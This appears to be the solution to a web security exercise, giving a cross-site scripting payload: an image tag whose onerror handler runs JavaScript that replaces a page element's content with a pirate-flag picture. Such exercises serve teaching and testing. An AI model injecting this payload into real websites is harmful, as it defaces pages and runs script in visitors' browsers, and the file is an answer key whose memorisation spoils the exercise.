# Solutions of Exercise 10

A message that would fulfil the requirements of Exercise 10 is:

```
<img src='x' onerror="
         (function(){
             document.getElementById('contentDivId').innerHTML = &quot;<img src='https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Pirate_Flag.svg/750px-Pirate_Flag.svg.png'/>&quot;;
         }());
         ">	
```